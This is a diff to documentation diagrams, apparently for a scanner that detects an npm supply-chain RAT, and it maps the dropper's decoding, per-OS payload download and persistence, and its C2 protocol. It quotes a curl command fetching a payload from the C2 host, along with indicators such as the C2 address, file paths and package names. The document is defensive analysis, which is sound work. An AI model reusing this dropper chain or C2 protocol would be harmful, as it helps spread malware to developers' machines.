@@ -73,42 +73,41 @@ sequenceDiagram
     participant Node as node setup.js
     participant Decode as Deobfuscation
     participant OS as OS Detection
-    participant C2 as sfrclak.com:8000
+    participant C2 as C2 Server
     participant Disk as Local Filesystem
 
     npm->>Node: postinstall hook triggers
-    Node->>Decode: Read stq[] encoded array
+    Node->>Decode: Read stq encoded array
     Decode->>Decode: Reverse each string
     Decode->>Decode: Base64 decode
-    Decode->>Decode: XOR with key "OrDeR_7077"<br/>index = 7 * i² % 10
-    Decode-->>Node: Decoded strings (paths, URLs, commands)
+    Decode->>Decode: XOR decrypt with key OrDeR_7077
+    Decode-->>Node: Decoded strings
 
     Node->>OS: process.platform check
 
-    alt macOS (darwin)
-        Node->>Disk: Write AppleScript to /tmp/*.scpt
-        Node->>OS: /usr/bin/osascript /tmp/*.scpt
-        OS->>C2: GET /6202033 (fetch binary)
+    alt macOS darwin
+        Node->>Disk: Write AppleScript to /tmp
+        Node->>OS: osascript executes .scpt
+        OS->>C2: GET /6202033 fetch binary
         C2-->>Disk: Write /Library/Caches/com.apple.act.mond
         Disk->>OS: /bin/zsh executes binary
-    else Windows (win32)
-        Node->>Disk: Copy powershell.exe → %PROGRAMDATA%\wt.exe
-        Node->>Disk: Write %TEMP%\6202033.vbs
-        Node->>Disk: Write %TEMP%\6202033.ps1
-        Node->>Disk: Write %PROGRAMDATA%\system.bat
-        Node->>Disk: Registry: HKCU\...\Run\MicrosoftUpdate → system.bat
-        Disk->>OS: wt.exe -NoProfile -ep Bypass 6202033.ps1
+    else Windows win32
+        Node->>Disk: Copy powershell.exe to ProgramData as wt.exe
+        Node->>Disk: Write 6202033.vbs and 6202033.ps1 to TEMP
+        Node->>Disk: Write system.bat to ProgramData
+        Node->>Disk: Set Registry Run key MicrosoftUpdate
+        Disk->>OS: wt.exe runs 6202033.ps1
     else Linux
-        Node->>OS: bash -c "curl sfrclak.com:8000/6202033"
-        OS->>C2: GET /6202033 (fetch python script)
+        Node->>OS: bash curl to C2
+        OS->>C2: GET /6202033 fetch python script
         C2-->>Disk: Write /tmp/ld.py
-        OS->>OS: nohup python3 /tmp/ld.py &
+        OS->>OS: nohup python3 /tmp/ld.py
     end
 
     Note over Node,Disk: Anti-forensics cleanup
-    Node->>Disk: fs.unlink(setup.js)
-    Node->>Disk: Delete package.json (malicious)
-    Node->>Disk: Rename package.md → package.json (clean)
+    Node->>Disk: Delete setup.js
+    Node->>Disk: Delete malicious package.json
+    Node->>Disk: Rename package.md to package.json
 ```
 
 ---
@@ -117,38 +116,45 @@ sequenceDiagram
 
 ```mermaid
 sequenceDiagram
-    participant RAT as RAT (victim)
-    participant C2 as sfrclak.com:8000
+    participant RAT as RAT victim
+    participant C2 as C2 sfrclak.com 8000
 
     Note over RAT: Generate 16-char random UID
 
-    RAT->>C2: HTTP POST /6202033<br/>User-Agent: mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)<br/>Body: Base64(JSON { type: "FirstInfo", uid, hostname, os, arch })
-    C2-->>RAT: 200 OK (acknowledged)
+    RAT->>C2: POST /6202033 with spoofed IE8 UA
+    Note right of RAT: Body is Base64 JSON FirstInfo
+    C2-->>RAT: 200 OK
 
     loop Every 60 seconds
-        RAT->>C2: HTTP POST /6202033<br/>Body: Base64(JSON { type: "BaseInfo", uid, ... })
-        
+        RAT->>C2: POST /6202033 BaseInfo beacon
         alt No pending commands
-            C2-->>RAT: 200 OK (empty)
-        else Command: runscript
-            C2-->>RAT: { cmd: "runscript", script: "..." }
+            C2-->>RAT: 200 OK empty
+        else runscript
+            C2-->>RAT: runscript command + payload
             RAT->>RAT: Execute script via shell
-            RAT->>C2: POST { type: "CmdResult", rsp_runscript: "..." }
-        else Command: rundir
-            C2-->>RAT: { cmd: "rundir", path: "..." }
+            RAT->>C2: CmdResult rsp_runscript
+        else rundir
+            C2-->>RAT: rundir command + path
             RAT->>RAT: Enumerate directory
-            RAT->>C2: POST { type: "CmdResult", rsp_rundir: [...] }
-        else Command: peinject (Windows only)
-            C2-->>RAT: { cmd: "peinject", dll: "<base64 DLL>" }
-            RAT->>RAT: Load DLL in-memory
-            RAT->>C2: POST { type: "CmdResult", rsp_peinject: "ok" }
-        else Command: kill
-            C2-->>RAT: { cmd: "kill" }
-            RAT->>RAT: Self-destruct
-            RAT->>C2: POST { type: "CmdResult", rsp_kill: "ok" }
+            RAT->>C2: CmdResult rsp_rundir
+        else peinject Windows only
+            C2-->>RAT: peinject + base64 DLL
+            RAT->>RAT: Load DLL in memory
+            RAT->>C2: CmdResult rsp_peinject
+        else kill
+            C2-->>RAT: kill command
+            RAT->>RAT: Self destruct
+            RAT->>C2: CmdResult rsp_kill
         end
     end
 ```
+
+**C2 Protocol Details:**
+- Transport: HTTP POST to `/6202033`
+- Encoding: Base64-encoded JSON body
+- User-Agent: `mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)`
+- Message types outbound: FirstInfo, BaseInfo, CmdResult
+- Commands inbound: runscript, rundir, peinject, kill
 
 ---
 
@@ -237,44 +243,43 @@ sequenceDiagram
     participant Scanner as axios-rat-scan
     participant Host as Host System
     participant FS as Filesystem
-    participant Reg as Registry (Windows)
+    participant Reg as Registry
     participant Proc as Process Table
     participant Net as Network Stack
 
-    Note over Scanner: Phase 0 — Host-level checks (instant)
+    Note over Scanner: Phase 0 Host-level checks
 
-    Scanner->>FS: Check RAT artifacts<br/>wt.exe, system.bat, com.apple.act.mond,<br/>ld.py, 6202033.*, *.scpt
-    FS-->>Scanner: exists? → SHA-256 verify against known hashes
+    Scanner->>FS: Check RAT file artifacts + SHA-256 hashes
+    FS-->>Scanner: Report any matches
 
-    Scanner->>Reg: Read HKCU\...\Run
-    Reg-->>Scanner: Flag MicrosoftUpdate / system.bat / wt.exe values
+    Scanner->>Reg: Read HKCU and HKLM Run keys
+    Reg-->>Scanner: Flag MicrosoftUpdate or suspicious values
 
-    Scanner->>Proc: Enumerate all processes (sysinfo)
-    Proc-->>Scanner: Flag wt.exe from ProgramData,<br/>com.apple.act.mond,<br/>python + /tmp/ld.py,<br/>IE8 UA in any cmdline
+    Scanner->>Proc: Enumerate all processes
+    Proc-->>Scanner: Flag RAT processes and C2 indicators
 
-    Scanner->>Net: Parse netstat/ss output
-    Net-->>Scanner: Flag connections to 142.11.206.73:8000
+    Scanner->>Net: Parse netstat + DNS cache + hosts file
+    Net-->>Scanner: Flag C2 connections and domain resolutions
 
-    Note over Scanner: Phase 1 — Discovery (walkdir)
+    Note over Scanner: Phase 1 Discovery walkdir
 
-    Scanner->>FS: Walk all drives, collect:<br/>package.json, lockfiles, yarn.lock,<br/>node_modules directories
-    FS-->>Scanner: npm_sources_map.yml written
+    Scanner->>FS: Walk all drives collecting npm targets
+    FS-->>Scanner: npm_sources_map.yml written + tree displayed
 
-    Note over Scanner: Phase 2 — npm scan (parallel via rayon)
+    Note over Scanner: Phase 2 IOC scan parallel via rayon
 
     par package.json files
-        Scanner->>FS: Check deps for axios@1.14.1/0.30.4,<br/>plain-crypto-js, @shadanai/openclaw,<br/>@qqbrowser/openclaw-qbot
-        Scanner->>FS: Check postinstall hooks for setup.js
-    and lockfiles
-        Scanner->>FS: Check locked versions in packages/dependencies
+        Scanner->>FS: Check deps and postinstall hooks
+    and lockfiles + pnpm-lock.yaml
+        Scanner->>FS: Check versions and integrity hashes
     and yarn.lock
         Scanner->>FS: Regex scan for compromised versions
     and node_modules
-        Scanner->>FS: Check plain-crypto-js/ exists<br/>Hash setup.js if present<br/>Check axios/package.json for injected deps
+        Scanner->>FS: Check installed packages and dropper
     end
 
-    Scanner-->>Scanner: Merge all findings, sort by severity
-    Scanner->>Host: Print report + exit code
+    Scanner-->>Scanner: Merge findings and sort by severity
+    Scanner->>Host: Print report + REPORT.txt + exit code
 ```
 
 ---
